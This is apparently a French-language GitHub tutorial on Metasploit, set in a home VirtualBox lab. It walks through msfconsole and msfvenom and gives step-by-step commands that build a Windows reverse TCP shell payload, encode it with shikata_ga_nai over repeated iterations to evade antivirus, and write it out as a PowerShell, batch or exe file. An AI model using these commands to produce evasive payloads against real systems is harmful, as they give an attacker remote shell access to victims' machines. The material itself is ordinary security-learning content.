# Les malwares

## Prérequis :
- virtual box
- kali linux dans virtual
- windows 10 dans virtual




## voilà une architecture de metasploite


<img width="1277" height="722" alt="image" src="https://github.com/user-attachments/assets/6713005c-ec08-48f7-819e-ee17dfd5a26c" />

## nous utiliserons msfconsole dans la console de kali linux dans virtual box en mode root :

<img width="1282" height="723" alt="image" src="https://github.com/user-attachments/assets/c60cd0f7-662b-4324-ad2a-2676bf5e0b9b" />

## commande pour lancer msfconsole :  

```bash
service postgresql start §§ apach2 start
msfdb init
msfconsole
```

### normalement vous avez ceci 

<img width="595" height="816" alt="image" src="https://github.com/user-attachments/assets/3f89b84b-abe9-40b9-a975-955ef7515b2f" />



## explication :

les exploits sont des codes malicieux permettant de détourner le fonctionement d'un programme à partir d'une vulnérabilité  

les auxilaires sont des outils permettant de scanner des systèmes , ce qui permettra de découvrir des ports, des services et des vulnérabilités  

les posts servent à la recherche d'information comme les mots de passe ,les dossiers d'une cible et d'autres informations   

les playload sont des codes malveillant que l'on injecte sur la cible en fonction de son architecture afin d'établir une connexion distante   

les encoders nous permettrons de dissimuler nos playload afin d'être le moins détecté par les systèmes de notre cible

les nops sont des structures par défaut qui permettront de faire fonctionner nos codes malveillants selon les plateformes (web = comment le site est fait,pc= système d exploitation,téléphone=os)

les evasions permmettent de générer des playload quasi indétectable par la grande majorité des anti virus

### après le lancement de msfconsole taper:

````bash
help
````

## explication :

### section core commande :
inserer des commandes de base pour faire des recherches

### section module commande :
obtenir des informations specifiques

### section job commande :
interagir avec un systeme 

### section ressource script commande :
permet d'ajouter nos scripts à nos tests d'intrusion

### section databse backend commande :
permet de faire de la reconnaissance sur nos cibles

### section credential backend commande :
renseigne sur l idendité sur nos cibles

### section developper commande :
possede les attribue de modification

### section dns commande :
Gérer le comportement de résolution DNS de Metasploit

### section msfconsole :
simple description

###  je vous ai expliquez les section des commande , pour toutes les commande la description se trouve a cote dans l interface consol msfconsole 
 ## exemple:

 <img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/2b809094-d5d6-41f1-8edd-e9c96c66e064" />
 

### je vais vous montrer comment faire des playload alors tout d abord qu est ce que c est des playload exactement 🤔 :

<img width="1280" height="718" alt="Capture d&#39;écran 2026-09-03 185758" src="https://github.com/user-attachments/assets/e8dc22d7-8e1e-4667-be57-02df2fa4e3e9" />

# generer un playload :

### commande a taper :

````bash
use PAYLOAD/
````

### vous verrez des milliers de champs qui vous ferront mal au crane (oui j ai eut mal -__-)

taper juste cette commande :

````bash
use payload/windows/x64/shell_reverse_tcp
````
il va creer  un shell Windows via une connexion TCP inverse.

# A partir de maintenant  toutes les commande ici serviront a comprendre le fonctionnement des malawrs car en une seul ligne cela suffit a creer le malwar.

regarder les option : 

````bash
options
````
ouvrez un nouveau terminal et taper :

````bash
ifconfig
````

critquez pas svp -__-

<img width="1920" height="922" alt="645845784-a7ac75af-2cea-4be0-bde2-e76bb0a98350" src="https://github.com/user-attachments/assets/48f4b797-0399-4a39-b506-f8b88090e2f5" />

## moi je suis en local (ip = 192.etc) pour pratiquer des test legal mais si vous configurez dans virutal box cliquer sur kali linux puis configuration puis reseau vous pourrez tout changer :

<img width="1917" height="1017" alt="image" src="https://github.com/user-attachments/assets/fc0183fb-80c6-4374-baaa-ba72bf103ed8" />

## ensuite :

### taper cette commande pour presiser votre adresse ip (remplacer mon ip par la votre )

````bash$
set Lhost 192.168.56.101
set LPORT 6000
````
## puis :
### taper cette commande pour avoir les commande et parametre possible a mettre sur votre platload :

````bash
generate -h
````
## puis on va generer le playload :

````bash
generate -b \x00\xff
````
## puis on va choisir l encoder du playload :

````bash
generate -h
show encoders
````
## encodons en shikataganai !:

````bash
generate -e x86/shikata_ga_nai
````

## ajouton l option binaire :

````bash
generate -e x86/shikata_ga_nai -b \xff
````

## format powershell :

````bash
generate -e x86/shikata_ga_nai -b \xff -f powershell
````

## format bat :

````bash
generate -e x86/shikata_ga_nai -b \xff -f bat
````

## double iteration pour rendre la lecture du code plus difficile :

````bash
generate -e x86/shikata_ga_nai -b \xff -i 2 -f powershell
````

ajouter un chemin de fichier pour creer le fichier :

````bash
generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f powershell
````
format exe malwar complet en une ligne :

````bash
generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f exe
````

## c est fini on peut toujours rajouter plus d iteration y a d autre format , encoder, forme,option ,playload,module possible explorer tout 👍

# maintenant nous allons utiliser msfvemon , tout d abord comprenons ce que c est :

<img width="1277" height="718" alt="image" src="https://github.com/user-attachments/assets/a23ff33c-6aea-44f4-9b44-0db65c87a241" />

## explication :

msfvemon est comme msfconsol ,nous avons pu voir seulement le module playload et encoder mais il en exisit 6 alors que msfvemon est concentrer que sur les playload et encoder on peut penser c bien mais oublier les menu chouette avec plein de chois les commande show encoder et option il n y a que deux commande pour vous aider  comme sur l image 

## tout d abord la commande pour avoir les option et parametre qui vont accompagner votre playload :

````bash
msfvenom -h
````

### personelement je trouve les menu de msfvenom complet illisible et nul mais sa simplicity en fait son avantage

<img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/4094e6bc-dde9-42fc-9b66-af0227b7812e" />


## puis la commande pour tous les playload et encoder toujours un depotoire illisible :

````bash
msfvenom -lall
````

### apres si vous connaissait bien les commande en 10 seconde votre malwar est fait pour n import quel cible , c est la puissance de msfvenom
